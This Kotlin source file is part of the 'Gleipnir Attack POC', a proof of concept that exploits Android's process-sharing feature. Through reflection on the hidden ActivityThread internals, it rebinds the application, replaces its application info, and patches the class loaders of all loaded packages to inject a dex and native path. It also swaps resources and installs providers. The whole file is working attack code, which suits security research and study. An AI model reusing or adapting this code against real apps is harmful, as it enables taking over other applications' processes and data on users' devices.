/*
 * Gleipnir Attack POC - Exploiting the Android process share feature
 * Copyright (C) <2020>  <Sascha Roth>
 *
 * This program is free software; you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation; either version 2 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License along
 * with this program; if not, write to the Free Software Foundation, Inc.,
 * 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
 */

package org.gleipnir.app.helpers.extensions

import android.app.Activity
import android.app.Application
import android.content.Context
import android.content.pm.ApplicationInfo
import android.content.pm.PackageInfo
import android.content.pm.ProviderInfo
import android.content.res.Resources
import android.util.ArrayMap
import org.gleipnir.app.reflectionHelper.getDeclaredMethod
import org.gleipnir.app.reflectionHelper.getReflective
import org.gleipnir.app.reflectionHelper.setReflective
import java.lang.ref.WeakReference
import java.lang.reflect.Method

// we cannot access ActivityThread  so let's attach it to Activity
fun Activity.getApplicationThread(activityThread: Any): Any {

    val getApplicationThreadMethod =
        activityThread::class.java.getMethod("getApplicationThread")
    getApplicationThreadMethod.isAccessible = true
    return getApplicationThreadMethod.invoke(activityThread)
}

fun attachApp(activityThread: Any) {
    val attachMethod =
        activityThread::class.java.getDeclaredMethod(
            "attach",
            java.lang.Boolean.TYPE,
            java.lang.Long.TYPE
        )
    attachMethod.isAccessible = true
    attachMethod.invoke(activityThread, false, 0)
}

fun callMain(activityThread: Any) {
    val attachMethod =
        activityThread::class.java.getMethod(
            "main", Array<String>::class.java
        )
    attachMethod.isAccessible = true
    attachMethod.invoke(null, arrayOfNulls<String>(0))
}

fun getBoundApplication(activityThread: Any): Any {
    val mBoundApplicationField = activityThread::class.java.getDeclaredField("mBoundApplication")
    mBoundApplicationField.isAccessible = true
    return mBoundApplicationField.get(activityThread)
}

fun setBoundActivity(activityThread: Any, boundApplication: Application?): Any {
    val mBoundApplicationField = activityThread::class.java.getDeclaredField("mBoundApplication")
    mBoundApplicationField.isAccessible = true
    return mBoundApplicationField.set(activityThread, boundApplication)
}

fun handleApplicationInfoChanged(activityThread: Any, applicationInfo: ApplicationInfo) {

    val handleApplicationInfoChangedMethod = getDeclaredMethod(
        activityThread::class.java, "handleApplicationInfoChanged",
            ApplicationInfo::class.java

    ) as Method
    handleApplicationInfoChangedMethod.isAccessible = true
    handleApplicationInfoChangedMethod.invoke(activityThread, applicationInfo)
}


fun getResourcesManager(activityThread: Any): Any {
    return getReflective<Any>(activityThread, "mResourcesManager")!!
}

fun getInstrumentation(activityThread: Any): Any {
    return getReflective<Any>(activityThread, "mInstrumentation")!!
}

fun handleBindApplication(
    activityThread: Any,
    packageInfo: PackageInfo,
    processName: String,
    sourceAppBindData: Any
) {
    val handleBindApplicationMethod =
        getDeclaredMethod(
            activityThread::class.java, "handleBindApplication",
                sourceAppBindData::class.java

        ) as Method
    resetServiceManager()

    setReflective(sourceAppBindData, "appInfo", packageInfo.applicationInfo)

    handleBindApplicationMethod.isAccessible = true

    handleBindApplicationMethod.invoke(activityThread, sourceAppBindData)
}

fun getPackageClassLoader(
    activityThread: Any,
    hostActivity: Activity
): ClassLoader? {
    getReflective<ArrayMap<String, *>>(activityThread, "mPackages")?.let { map ->
        val ref =
            map[hostActivity.packageName] as WeakReference<*>?
        val apk = ref!!.get()
        val apkClass: Class<*> = apk!!.javaClass
        val loader = getReflective<ClassLoader>(apk, apkClass, "mClassLoader")
        return@getPackageClassLoader loader
    }
    return null
}

fun patchPackageClassLoader(
    activityThread: Any,
    hostActivity: Activity,
    classLoader: ClassLoader,
    dexPath: String,
    nativePath: String
) {

    getReflective<ArrayMap<String, *>>(activityThread, "mPackages")?.let { map ->
        val ref =
            map[hostActivity.packageName] as WeakReference<*>?
        val apk = ref!!.get()
        val apkClass: Class<*> = apk!!.javaClass
        val loader = getReflective<ClassLoader>(apk, apkClass, "mClassLoader")
        loader?.patch(dexPath, nativePath)
        setReflective(apk, "mClassLoader", classLoader)
    }
}


fun patchClassLoaderOfAllPackages(
    activityThread: Any,
    hostActivity: Activity,
    classLoader: ClassLoader,
    dexPath: String,
    nativePath: String
) {
    getReflective<ArrayMap<Any, WeakReference<Any>>>(activityThread, "mPackages")?.forEach {
        it?.value?.get()?.let {
            getReflective<ClassLoader>(it, "mClassLoader")?.patch(
                dexPath,
                nativePath
            )
            getReflective<ClassLoader>(it, "mBaseClassLoader")?.patch(
                dexPath,
                nativePath
            )
        }
    }
}

fun getPackages(activityThread: Any): ArrayMap<Any, WeakReference<Any>>? {
    return getReflective<ArrayMap<Any, WeakReference<Any>>>(activityThread, "mPackages")
}

fun patchResourcesOfAllPackages(
    activityThread: Any,
    resourcesImpl: Any
) {
    getPackages(activityThread)?.forEach {
        it?.value?.get()?.let {
            getReflective<Resources>(it, "mResources")?.setImpl(resourcesImpl)
        }
    }
}

fun installProvider(activityThread: Any, providerInfo: ProviderInfo) {
    val providerInstallMethod = getDeclaredMethod(
        activityThread::class.java,
        "scheduleInstallProvider",
        ProviderInfo::class.java
    ) as Method
    providerInstallMethod.isAccessible = true
    providerInstallMethod.invoke(activityThread, providerInfo)
}

fun getSystemContext(activityThread: Any) {
    val systemContext = getReflective<Context>(activityThread, "mSystemContext")

}